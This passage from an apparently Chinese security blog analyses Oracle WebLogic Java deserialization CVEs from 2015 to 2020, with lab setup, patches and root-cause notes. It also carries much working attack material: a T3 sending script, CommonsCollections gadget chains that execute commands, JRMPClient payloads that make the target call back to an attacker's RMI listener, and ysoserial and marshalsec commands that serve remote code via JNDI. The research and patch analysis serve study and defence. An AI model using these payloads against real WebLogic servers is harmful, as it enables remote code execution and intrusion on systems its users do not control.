+<pre><code class="shell">sed -i s@/archive.ubuntu.com/@/mirrors.aliyun.com/@g /etc/apt/sources.list
+apt-get clean
+apt-get update
+apt-get install tcpdump
+tcpdump -w /tmp/tcp.cap
+docker cp [weblogic id]:/tmp/tcp.cap ./</code></pre>
+</li>
+</ol>
+<h3 id="weblogic-12-2-1-4"><a href="#weblogic-12-2-1-4" class="headerlink" title="weblogic: 12.2.1.4"></a>weblogic: 12.2.1.4</h3><blockquote>
+<p>参考<a target="_blank" rel="noopener" href="https://hub.docker.com/_/oracle-weblogic-server-12c">官网</a>，后面的CVE-2020-13645会用到</p>
+</blockquote>
+<ol>
+<li><p>在当前路路径创建<code>domain.properties</code>文件</p>
+<blockquote>
+<p>注意密码需要至少8个字符，且至少有1个数字或特殊符号，否则会报错</p>
+</blockquote>
+<pre><code class="json">username=myadminusername
+password=myadminpassword!</code></pre>
+</li>
+<li><p>创建<code>docker-compose.yml</code>文件</p>
+<blockquote>
+<p>默认是生产模式，所以这里把PRODUCTION_MODE设为””，否则无法调试</p>
+<p>DOMAIN_NAME默认为空，这里设置为”base_domain”，否则会报找不到文件错误</p>
+</blockquote>
+<pre><code class="yml">version: &#39;2&#39;
+services:
+    weblogic:
+        image: store/oracle/weblogic:12.2.1.4-dev-200117
+        environment:
+            DOMAIN_NAME: &quot;base_domain&quot;
+            debugFlag: &quot;true&quot;
+            PRODUCTION_MODE: &quot;&quot;
+            ADMINISTRATION_PORT_ENABLED: &quot;false&quot;
+        volumes:
+          - type: bind
+            source: ./
+            target: /u01/oracle/properties
+        ports:
+            - &quot;7001:7001&quot;
+            - &quot;8453:8453&quot;
+            - &quot;9002:9002&quot;</code></pre>
+</li>
+<li><p>启动docker</p>
+<pre><code class="shell">docker-compose up -d</code></pre>
+</li>
+<li><p>拷贝源码和jdk</p>
+<pre><code class="shell">docker cp [weblogic id]:/u01 ./u01</code></pre>
+</li>
+<li><p>后面步骤和上面一样</p>
+</li>
+</ol>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="JAVA反序列化"><a href="#JAVA反序列化" class="headerlink" title="JAVA反序列化"></a>JAVA反序列化</h3><h4 id="CVE-2015-4852"><a href="#CVE-2015-4852" class="headerlink" title="CVE-2015-4852"></a>CVE-2015-4852</h4><blockquote>
+<p>Oracle WebLogic Server 10.3.6.0、12.1.2.0、12.1.3.0、12.2.1.0</p>
+</blockquote>
+<p><strong>payload</strong></p>
+<p>生成反序列化payload</p>
+<pre><code class="python">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections1 &quot;touch /tmp/success&quot; &gt; poc.ser</code></pre>
+<p>祖传T3脚本</p>
+<pre><code class="python">import binascii
+import socket
+import time
+
+def t3_send(ip, port, file):
+    t3_header = &#39;t3 10.3.6\nAS:255\nHL:19\n\n&#39;
+    host = (ip, int(port))
+    # socket connect
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(15)
+    sock.connect(host)
+    # send t3 header
+    sock.send(t3_header.encode(&#39;utf-8&#39;))
+    # time.sleep(1)
+    resp1 = sock.recv(1024)
+    # first part
+    data1 = &#39;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000&#39;
+    # second part, BIN -&gt; HEX
+    with open(file, &#39;rb&#39;) as f:
+        payload = binascii.b2a_hex(f.read()).decode(&#39;utf-8&#39;)
+    # join
+    data = data1 + payload
+    # get lenth and join
+    data = &#39;%s%s&#39; % (&#39;&#123;:08x&#125;&#39;.format(len(data) // 2 + 4), data)
+    # a2b: HEX -&gt; BIN
+    sock.send(binascii.a2b_hex(data))
+
+if __name__ == &#39;__main__&#39;:
+    t3_send(&#39;127.0.0.1&#39;,&#39;7001&#39;,&#39;poc.ser&#39;)</code></pre>
+<p><strong>漏洞分析</strong></p>
+<p>漏洞利用的原理利用<code>TransformedMap.setValue()</code>或者<code>LazyMap.get()</code>（ysoserial用的就是这个方法）方法来触发<code>Apache Commons Collections</code>，而在我们的<code>AnnotationInvocationHandler</code>类中，都含有这两个方法的调用，下面我们来看一下它们的入口点</p>
+<p>以<code>TransformedMap</code>为例，在<code>AnnotationInvocationHandler</code>类中，我们可以发现<code>memberValues</code>的类型为<code>Map&lt;String, Object&gt;</code>，我们可以控制其类型为<code>TransformedMap</code>，然后<code>readObject()</code>方法的方法中，我们可以看到<code>entrySet</code>调用了<code>setValue()</code>方法，满足利用条件</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271435a1f8cd7abec091ddbb24.png" alt="image-20210124182703110"></p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271435b5a259cd2d0a4f07dfb2.png" alt="image-20210124182534426"></p>
+<blockquote>
+<p>这里有一处小细节就是，为了让var7非空，我们需要执行<code>innerMap.put(&quot;value&quot;, &quot;value&quot;);</code>，原因是我们的var3的值为[“value”] =&gt; “class java.lang.annotaion.RetentionPolicy”，即只有一个”value”的key值，具体可自行去参考它的实现</p>
+</blockquote>
+<p>这里给出代码实现</p>
+<pre><code class="java">import java.io.;
+import java.lang.annotation.Retention;
+import java.lang.annotation.Target;
+import java.lang.reflect.Constructor;
+import java.util.HashMap;
+import java.util.Map;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+
+public class CommonsCollection1 &#123;
+    public static void main(String[] args) throws Exception &#123;
+        //Runtime.getRuntime().exec(&quot;calc&quot;); 
+        Transformer[] transformers = new Transformer[] &#123;
+            new ConstantTransformer(Runtime.class),
+            new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;
+                String.class, Class[].class
+                    &#125;, new Object[] &#123;
+                &quot;getRuntime&quot;,
+                new Class[0]
+            &#125;),
+            new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;
+                Object.class, Object[].class
+                    &#125;, new Object[] &#123;
+                null,
+                new Object[0]
+            &#125;),
+            new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;
+                String.class
+                    &#125;, new Object[] &#123;
+                &quot;calc&quot;
+            &#125;)
+        &#125;;
+        Transformer chainedTransformer = new ChainedTransformer(transformers);
+        //只需要有一处调用 chainedTransformer 
+        Map inMap = new HashMap();
+        inMap.put(&quot;value&quot;, &quot;value&quot;);
+        Map outMap = TransformedMap.decorate(inMap, null, chainedTransformer);
+        Class cls = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        Constructor ctor = cls.getDeclaredConstructor(new Class[] &#123;
+            Class.class, Map.class
+        &#125;);
+        ctor.setAccessible(true);
+        Object instance = ctor.newInstance(new Object[] &#123;
+            Retention.class, outMap
+        &#125;);
+        // 写出到文件
+        FileOutputStream fos = new FileOutputStream(&quot;payload.ser&quot;);
+        ObjectOutputStream oos = new ObjectOutputStream(fos);
+        oos.writeObject(instance);
+        oos.flush();
+        oos.close();
+        // 模拟触发代码执行 
+        FileInputStream fis = new FileInputStream(&quot;payload.ser&quot;);
+        ObjectInputStream ois = new ObjectInputStream(fis);
+        Object newObj = ois.readObject();
+        ois.close();
+    &#125;
+&#125;</code></pre>
+<p>以<code>LazyMap</code>为例，触发点在调用<code>memerValues.entrySet()</code>时会触发它的<code>invoke()</code>方法，其中存在<code>get()</code>方法满足利用条件</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714358835f39a30b4f5a8bb38.png" alt="image-20210124192432215"></p>
+<p>代码的实现参考ysoserial的</p>
+<pre><code class="java">package ysoserial.payloads;
+
+import java.lang.reflect.InvocationHandler;
+import java.util.HashMap;
+import java.util.Map;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+import ysoserial.payloads.annotation.Authors;
+import ysoserial.payloads.annotation.Dependencies;
+import ysoserial.payloads.annotation.PayloadTest;
+import ysoserial.payloads.util.Gadgets;
+import ysoserial.payloads.util.JavaVersion;
+import ysoserial.payloads.util.PayloadRunner;
+import ysoserial.payloads.util.Reflections;
+
+@PayloadTest(precondition = &quot;isApplicableJavaVersion&quot;)
+@Dependencies(&#123;
+    &quot;commons-collections:commons-collections:3.1&quot;
+&#125;)
+@Authors(&#123;
+    &quot;frohoff&quot;
+&#125;)
+public class CommonsCollections1
+    extends PayloadRunner
+    implements ObjectPayload &lt; InvocationHandler &gt; &#123;
+    public InvocationHandler getObject(String command)
+    throws Exception &#123;
+        String[] execArgs = &#123;
+            command
+        &#125;;
+        Transformer transformerChain = new ChainedTransformer(new Transformer[] &#123;
+            new ConstantTransformer(Integer.valueOf(1))
+        &#125;);
+        Transformer[] transformers = &#123;
+            new ConstantTransformer(Runtime.class),
+            new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;
+                String.class, Class[].class
+            &#125;, new Object[] &#123;
+                &quot;getRuntime&quot;,
+                new Class[0]
+            &#125;),
+            new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;
+                Object.class, Object[].class
+            &#125;, new Object[] &#123;
+                null,
+                new Object[0]
+            &#125;),
+            new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;
+                String.class
+            &#125;, execArgs),
+            new ConstantTransformer(Integer.valueOf(1))
+        &#125;;
+        Map innerMap = new HashMap();
+        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
+        Map mapProxy = (Map) Gadgets.createMemoitizedProxy(lazyMap, Map.class, new Class[0]);
+        InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);
+        Reflections.setFieldValue(transformerChain, &quot;iTransformers&quot;, transformers);
+        return handler;
+    &#125;
+
+    public static void main(String[] args)
+    throws Exception &#123;
+        PayloadRunner.run(CommonsCollections1.class, args);
+    &#125;
+
+    public static boolean isApplicableJavaVersion() &#123;
+        return JavaVersion.isAnnInvHUniversalMethodImpl();
+    &#125;
+&#125;</code></pre>
+<p><strong>补丁</strong></p>
+<p>增加<code>ClassFilter.isBlackListed()</code>函数并把涉及到的3个类加入到黑名单</p>
+<pre><code>weblogic.rjvm.InboundMsgAbbrev.class::ServerChannelInputStream
+weblogic.rjvm.MsgAbbrevInputStream.class
+weblogic.iiop.Utils.class</code></pre><h4 id="CVE-2016-0638"><a href="#CVE-2016-0638" class="headerlink" title="CVE-2016-0638"></a>CVE-2016-0638</h4><p><strong>工具利用</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/5up3rc/weblogic_cmd">https://github.com/5up3rc/weblogic_cmd</a></p>
+<p>IDEA创建application配置，在Program arguments填入，或者导出.jar</p>
+<pre><code class="shell">-H &quot;127.0.0.1&quot; -C &quot;touch /tmp/success&quot; -B -os linux</code></pre>
+<p><strong>漏洞分析</strong></p>
+<p>此漏洞是对CVE-2015-4852的黑名单进行绕过，对整个利用链再加一层封装即可绕过黑名单，新的利用点在<code>weblogic.jms.common.StreamMessageImpl</code>类中的<code>readExternal()</code>方法把传入的序列化数据，调用到上面CVE-2015-4852提到的<code>readObject()</code>的方法</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714353df5a7a5d2ddf1caaef7.png" alt="image-20210125161308443"></p>
+<p>所以exploit的写法就是把<code>CommonsCollections1</code>的实现再套一层<code>StreamMessageImpl</code></p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021356fb595eb0794698ec7722.png" alt="image-20210127205403637"></p>
+<p><strong>补丁</strong></p>
+<p>把涉及类加入到黑名单</p>
+<pre><code>weblogic.jms.common.StreamMessageImpl</code></pre><h4 id="CVE-2016-3510"><a href="#CVE-2016-3510" class="headerlink" title="CVE-2016-3510"></a>CVE-2016-3510</h4><blockquote>
+<p>Oracle WebLogic Server 10.3.6.0、12.1.2.0、12.1.3.0、12.2.1.0</p>
+</blockquote>
+<p><strong>工具利用</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/5up3rc/weblogic_cmd">https://github.com/5up3rc/weblogic_cmd</a></p>
+<p>修改TYPE如下</p>
+<pre><code class="java">public static String TYPE = &quot;marshall&quot;;</code></pre>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714356a85e15315bcd21561f5.png" alt="image-20210125163013383"></p>
+<p><strong>漏洞分析</strong></p>
+<p>这个CVE也是对CVE-2015-4852的黑名单进行绕过，利用到的类是<code>weblogic.corba.utils.MarshalledObject</code>类，在反序列化这个类的时候会调用<code>readResolve()</code>方法，里面也调用了ObjectInputStream的<code>readObject()</code>方法</p>
+<p><code>MarshalledObject</code>在构造时把参数<code>var1</code>传到<code>this.objBytes</code></p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271436987d24cd4e9b48d1de9b.png" alt="image-20210125163953194"></p>
+<p>在调用<code>readResolve()</code>方法时会触发<code>readObject()</code>函数</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271436a8b136590b4722202792.png" alt="image-20210125164049349"></p>
+<p>同理exploit的写法是把<code>CommonsCollections1</code>的实现再套一层<code>MarshalledObject</code></p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021020213564684f54ab2b300cdfcdd.png" alt="image-20210127205454949"></p>
+<p><strong>补丁</strong></p>
+<p>把涉及类加入到黑名单</p>
+<pre><code>weblogic.corba.utils.MarshalledObject</code></pre><h4 id="CVE-2017-3248"><a href="#CVE-2017-3248" class="headerlink" title="CVE-2017-3248"></a>CVE-2017-3248</h4><blockquote>
+<p>Oracle WebLogic Server 10.3.6.0、12.1.2.0、12.1.3.0、12.2.1.0</p>
+</blockquote>
+<p><strong>poc</strong></p>
+<pre><code class="shell">java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections1 &#39;touch /tmp/success&#39;</code></pre>
+<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/44553">攻击脚本</a></p>
+<pre><code class="shell">python exploit.py 127.0.0.1 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 172.25.144.219 7777 JRMPClient</code></pre>
+<pre><code class="java">// JRMPClient
+package ysoserial.payloads;
+
+import java.lang.reflect.Proxy;
+import java.rmi.registry.Registry;
+import java.rmi.server.ObjID;
+import java.rmi.server.RemoteObjectInvocationHandler;
+import java.util.Random;
+import sun.rmi.server.UnicastRef;
+import sun.rmi.transport.LiveRef;
+import sun.rmi.transport.tcp.TCPEndpoint;
+import ysoserial.payloads.annotation.Authors;
+import ysoserial.payloads.annotation.PayloadTest;
+import ysoserial.payloads.util.PayloadRunner;
+
+@SuppressWarnings ( &#123;
+    &quot;restriction&quot;
+&#125; )
+@PayloadTest( harness = &quot;ysoserial.payloads.JRMPReverseConnectSMTest&quot;)
+@Authors(&#123; Authors.MBECHLER &#125;)
+public class JRMPClient extends PayloadRunner implements ObjectPayload&lt;Registry&gt; &#123;
+
+    public Registry getObject ( final String command ) throws Exception &#123;
+        String host;
+        int port;
+        int sep = command.indexOf(&#39;:&#39;);
+        if ( sep &lt; 0 ) &#123;
+            port = new Random().nextInt(65535);
+            host = command;
+        &#125;
+        else &#123;
+            host = command.substring(0, sep);
+            port = Integer.valueOf(command.substring(sep + 1));
+        &#125;
+        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
+        TCPEndpoint te = new TCPEndpoint(host, port);
+        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
+        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
+        Registry proxy = (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[] &#123;
+            Registry.class
+        &#125;, obj);
+        return proxy;
+    &#125;
+
+    public static void main ( final String[] args ) throws Exception &#123;
+        Thread.currentThread().setContextClassLoader(JRMPClient.class.getClassLoader());
+        PayloadRunner.run(JRMPClient.class, args);
+    &#125;
+&#125;</code></pre>
+<p><strong>漏洞分析</strong></p>
+<p>这里其实利用到了RMI和DGC的机制，当<strong>DGC Client</strong>调用远程对象时，会调用<strong>DGC Server</strong>的<code>dirty()</code>函数，这时<strong>DGC Server</strong>就向<strong>DGC Client</strong>返回一个<code>lease(DGCClient.vmid, DGCClient.leaseValue)</code>；当<strong>DGC Client</strong>不需要这个远程对象时，就会调用<strong>DGC Server</strong>的<code>clean()</code>函数，这个漏洞的关键点就在于我们可以伪造恶意的DGC Server向<strong>DGC Client</strong>，即victim，回送一个包含恶意payload的对象，让<strong>DGC Client</strong>在DGC层执行反序列化触发payload</p>
+<p>漏洞链如下</p>
+<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271436405b059050f3937f636e.png" alt="image-20210126142905037" style="zoom:67%;" />
+
+<p><strong>补丁</strong></p>
+<p>在<code>resolveProxyClass()</code>方法中加入对<code>java.rmi.registry.Registry</code>的检查</p>
+<pre><code class="java">protected Class&lt;?&gt; resolveProxyClass(String[] interfaces) throws IOException, ClassNotFoundException &#123;
+    String[] arr$ = interfaces;
+    int len$ = interfaces.length;
+
+    for(int i$ = 0; i$ &lt; len$; ++i$) &#123;
+        String intf = arr$[i$];
+        if(intf.equals(&quot;java.rmi.registry.Registry&quot;)) &#123;
+            throw new InvalidObjectException(&quot;Unauthorized proxy deserialization&quot;);
+        &#125;
+    &#125;
+
+    return super.resolveProxyClass(interfaces);
+&#125;</code></pre>
+<h4 id="CVE-2018-2628"><a href="#CVE-2018-2628" class="headerlink" title="CVE-2018-2628"></a>CVE-2018-2628</h4><blockquote>
+<p>Oracle WebLogic Server 10.3.6.0、12.1.3.0、12.2.1.2、12.2.1.3</p>
+</blockquote>
+<p><strong>poc</strong></p>
+<pre><code class="shell">java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections1 &#39;touch /tmp/success&#39;</code></pre>
+<pre><code class="shell">python exploit.py 127.0.0.1 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 172.25.144.219 7777 JRMPClient2</code></pre>
+<blockquote>
+<p>还有一种通过CVE-2016-1000031 Apache Commons Fileupload进行任意文件写入</p>
+<p>再者可以直接去掉CVE-2017-3248的Proxy的封装，从而直接绕过resolveProxyClass()方法</p>
+</blockquote>
+<p><strong>漏洞分析</strong></p>
+<p>此漏洞是对CVE-2017-3248的绕过，因为<code>InboundMsgAbbrev</code>类的<code>resolveProxyClass()</code>仅仅只是对<code>java.rmi.registry.Registry</code>进行判断，所以我们可以通过其他RMI接口绕过，比如<code>java.rmi.activation.Activator</code></p>
+<p>exploit的编写就是直接替换</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101272148c437c1ee4656e33bf769.png" alt="image-20210127214823732"></p>
+<p><strong>补丁</strong></p>
+<p>在<code>WeblogicFilterConfig.class</code>的黑名单中添加了<code>sun.rmi.server.UnicastRef</code>进行防御</p>
+<pre><code class="java">private static final String[] DEFAULT_BLACKLIST_CLASSES = new String[]&#123;
+     &quot;org.codehaus.groovy.runtime.ConvertedClosure&quot;, 
+     &quot;org.codehaus.groovy.runtime.ConversionHandler&quot;, 
+     &quot;org.codehaus.groovy.runtime.MethodClosure&quot;,
+     &quot;org.springframework.transaction.support.AbstractPlatformTransactionManager&quot;, 
+     &quot;sun.rmi.server.UnicastRef&quot; // new
+ &#125;;</code></pre>
+<h4 id="CVE-2018-2893"><a href="#CVE-2018-2893" class="headerlink" title="CVE-2018-2893"></a>CVE-2018-2893</h4><blockquote>
+<p>Oracle WebLogic Server 10.3.6.0、12.1.3.0、12.2.1.2、12.2.1.3</p>
+</blockquote>
+<p><strong>payload</strong></p>
+<pre><code class="java">public class JRMPClient3 extends PayloadRunner implements ObjectPayload &lt; Registry &gt; &#123;
+
+    public Object streamMessageImpl(byte[] object) &#123;
+        StreamMessageImpl streamMessage = new StreamMessageImpl();
+        streamMessage.setDataBuffer(object, object.length);
+        return streamMessage;
+    &#125;
+
+    public Object getObject(final String command) throws Exception &#123;
+        String host;
+        int port;
+        int sep = command.indexOf(&#39;:&#39;);
+        if (sep &lt; 0) &#123;
+            port = new Random().nextInt(65535);
+            host = command;
+        &#125; else &#123;
+            host = command.substring(0, sep);
+            port = Integer.valueOf(command.substring(sep + 1));
+        &#125;
+        ObjID objID = new ObjID(new Random().nextInt());
+        TCPEndpoint tcpEndpoint = new TCPEndpoint(host, port);
+        UnicastRef unicastRef = new UnicastRef(new LiveRef(objID, tcpEndpoint, false));
+        RemoteObjectInvocationHandler remoteObjectInvocationHandler = new RemoteObjectInvocationHandler(unicastRef);
+        Object object = Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[] &#123;
+            Registry.class
+        &#125;, remoteObjectInvocationHandler);
+        return streamMessageImpl(Serializer.serialize(object)); // 用streamMessageImpl封装
+    &#125;
+
+    public static void main(final String[] args) throws Exception &#123;
+        Thread.currentThread().setContextClassLoader(JRMPClient3.class.getClassLoader());
+        PayloadRunner.run(JRMPClient3.class, args);
+    &#125;
+&#125;</code></pre>
+<p><strong>漏洞分析</strong></p>
+<p>此漏洞是对CVE-2018-2628的黑名单绕过，主要利用<code>weblogic.jms.common.StreamMessageImpl</code>在反序列化时不用经过<code>resolveProxyClass()</code>检查</p>
+<p><strong>补丁</strong></p>
+<pre><code class="java">private static final String[] DEFAULT_BLACKLIST_PACKAGES = &#123; 
+    &quot;org.apache.commons.collections.functors&quot;, 
+    &quot;com.sun.org.apache.xalan.internal.xsltc.trax&quot;, 
+    &quot;javassist&quot;, 
+    &quot;java.rmi.activation&quot;, // new
+    &quot;sun.rmi.server&quot; // new
+&#125;;
+
+private static final String[] DEFAULT_BLACKLIST_CLASSES = new String[] &#123;
+    &quot;org.codehaus.groovy.runtime.ConvertedClosure&quot;, 
+    &quot;org.codehaus.groovy.runtime.ConversionHandler&quot;, 
+    &quot;org.codehaus.groovy.runtime.MethodClosure&quot;, 
+    &quot;org.springframework.transaction.support.AbstractPlatformTransactionManager&quot;, 
+    &quot;java.rmi.server.UnicastRemoteObject&quot;, // new
+    &quot;java.rmi.server.RemoteObjectInvocationHandler&quot; // new
+&#125;;</code></pre>
+<h4 id="CVE-2018-3245"><a href="#CVE-2018-3245" class="headerlink" title="CVE-2018-3245"></a>CVE-2018-3245</h4><blockquote>
+<p>Oracle WebLogic Server 10.3.6.0、12.1.3.0、12.2.1.3</p>
+</blockquote>
+<p><strong>poc</strong></p>
+<p><em>payload1</em></p>
+<pre><code class="java">package ysoserial.payloads;
+
+import java.rmi.server.ObjID;
+import java.util.Random;
+import sun.rmi.server.UnicastRef;
+import sun.rmi.transport.LiveRef;
+import sun.rmi.transport.tcp.TCPEndpoint;
+import ysoserial.payloads.util.PayloadRunner;
+import javax.management.remote.rmi.RMIConnectionImpl_Stub;
+
+
+@SuppressWarnings ( &#123;
+    &quot;restriction&quot;
+&#125; )
+public class JRMPClient3 extends PayloadRunner implements ObjectPayload&lt;Object&gt; &#123;
+
+    public Object getObject ( final String command ) throws Exception &#123;
+
+        String host;
+        int port;
+        int sep = command.indexOf(&#39;:&#39;);
+        if ( sep &lt; 0 ) &#123;
+            port = new Random().nextInt(65535);
+            host = command;
+        &#125;
+        else &#123;
+            host = command.substring(0, sep);
+            port = Integer.valueOf(command.substring(sep + 1));
+        &#125;
+        ObjID id = new ObjID(new Random().nextInt());
+        TCPEndpoint te = new TCPEndpoint(host, port);
+        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
+        RMIConnectionImpl_Stub stub = new RMIConnectionImpl_Stub(ref); // 使用RMIConnectionImpl_Stub封装
+        return stub;
+    &#125;
+
+    public static void main ( final String[] args ) throws Exception &#123;
+        Thread.currentThread().setContextClassLoader(JRMPClient3.class.getClassLoader());
+        PayloadRunner.run(JRMPClient3.class, args);
+    &#125;
+&#125;</code></pre>
+<p><em>payload2</em></p>
+<pre><code class="java">package ysoserial.payloads;
+
+import java.rmi.server.ObjID;
+import java.util.Random;
+import com.sun.jndi.rmi.registry.ReferenceWrapper_Stub;
+import sun.rmi.server.UnicastRef;
+import sun.rmi.transport.LiveRef;
+import sun.rmi.transport.tcp.TCPEndpoint;
+import ysoserial.payloads.annotation.Authors;
+import ysoserial.payloads.annotation.PayloadTest;
+import ysoserial.payloads.util.PayloadRunner;
+
+@SuppressWarnings ( &#123;
+    &quot;restriction&quot;
+&#125; )
+public class JRMPClient4 extends PayloadRunner implements ObjectPayload&lt;ReferenceWrapper_Stub&gt; &#123;
+
+    public ReferenceWrapper_Stub  getObject ( final String command ) throws Exception &#123;
+
+        String host;
+        int port;
+        int sep = command.indexOf(&#39;:&#39;);
+        if ( sep &lt; 0 ) &#123;
+            port = new Random().nextInt(65535);
+            host = command;
+        &#125;
+        else &#123;
+            host = command.substring(0, sep);
+            port = Integer.valueOf(command.substring(sep + 1));
+        &#125;
+        ObjID id = new ObjID(new Random().nextInt());
+        TCPEndpoint te = new TCPEndpoint(host, port);
+        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
+        ReferenceWrapper_Stub stu = new ReferenceWrapper_Stub(ref); // 使用ReferenceWrapper_Stub封装
+        return stu;
+    &#125;
+
+    public static void main ( final String[] args ) throws Exception &#123;
+        Thread.currentThread().setContextClassLoader(JRMPClient3.class.getClassLoader());
+        PayloadRunner.run(JRMPClient3.class, args);
+    &#125;
+&#125;</code></pre>
+<p><strong>漏洞分析</strong></p>
+<p>此漏洞是对cve-2018-2893的黑名单绕过，可以使用<code>ReferenceWrapper_Stub</code>或者<code>RMIConnectionImpl_Stub</code>代替<code>RemoteObjectInvocationHandler</code>，关键是在找<code>RemoteObject</code>类的子类</p>
+<p><strong>补丁</strong></p>
+<p>直接将基类<code>RemoteObject</code>加入到黑名单</p>
+<h4 id="CVE-2019-2890"><a href="#CVE-2019-2890" class="headerlink" title="CVE-2019-2890"></a>CVE-2019-2890</h4><blockquote>
+<p>WebLogic Server 10.3.6.0、12.1.3.0、12.2.1.3</p>
+</blockquote>
+<p><strong>工具利用</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/SukaraLin/CVE-2019-2890">https://github.com/SukaraLin/CVE-2019-2890</a></p>
+<p>详细操作在README已经给出</p>
+<p><strong>漏洞分析</strong></p>
+<p>漏洞代码位于<code>weblogic.jar</code>中的<code>weblogic.wsee.jaxws.persistence.PersistentContext.class</code>类中，它的<code>readSubject()</code>方法中直接调用了<code>readObject()</code>方法进行反序列化，所以我们只要对着<code>writeObject()</code>写一个恶意对象就可以</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714373db23c5e588f464ce262.png" alt="image-20210126175015051"></p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271437983682858b6836f4756d.png" alt="image-20210126175040943"></p>
+<p><strong>补丁</strong></p>
+<p>增加黑名单检测</p>
+<pre><code class="java">public static class WSFilteringObjectInputStream extends FilteringObjectInputStream &#123;
+    private String firstClassName;
+
+    public WSFilteringObjectInputStream(InputStream in) throws IOException &#123;
+        super(in);
+    &#125;
+
+    protected Class&lt;?&gt; resolveClass(ObjectStreamClass descriptor) throws ClassNotFoundException, IOException &#123; 
+        Class clazz = super.resolveClass(descriptor);
+        if (this. firstClassName == null) &#123;
+            String className = descriptor.getName(); 
+
+            try &#123;
+                clazz.asSubclass(Subject.class);]
+            &#125; catch (Exception var5) &#123;
+                throw new InvalidClassException(&quot;Internal System Error&quot;);
+            &#125;
+            this. firstClassName = className;
+        &#125;
+        return clazz;
+    &#125;
+&#125;</code></pre>
+<h4 id="CVE-2020-2551"><a href="#CVE-2020-2551" class="headerlink" title="CVE-2020-2551"></a>CVE-2020-2551</h4><blockquote>
+<p>WebLogic Server 10.3.6.0.0、12.1.3.0.0、12.2.1.3.0、12.2.1.4.0</p>
+</blockquote>
+<p><strong>工具利用</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Y4er/CVE-2020-2551.git">https://github.com/Y4er/CVE-2020-2551.git</a></p>
+<p>这个payload只能用在直连网络下，所以Win下本地打docker是打不了的，你可以选择自己本地搭一个服务器，可以选择在Linux虚拟机起docker，当然还有更简单的就是自己在docker里装个jdk8，然后在docker里打（因为这个payload只能用jdk8运行）</p>
+<p>创建依赖库的<code>wlfullclient.jar</code></p>
+<pre><code class="shell">cd WL_HOME/server/lib
+java -jar wljarbuilder.jar</code></pre>
+<p>编译exp.java，这里必须保证jdk版本与目标环境一样</p>
+<pre><code class="shell">javac -source 1.6 -target 1.6 exp.java</code></pre>
+<p>开启JNDI触发漏洞</p>
+<pre><code class="shell">python -m SimpleHTTPServer 80
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar  marshalsec.jndi.RMIRefServer &quot;http://172.18.0.2/#exp&quot; 1099
+java -jar CVE-2020-2551.jar 172.18.0.2 7001 rmi://172.18.0.2:1099/exp</code></pre>
+<p><strong>漏洞分析</strong></p>
+<p>RMI-IIOP具体原理可参考这篇<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7422">文章</a></p>
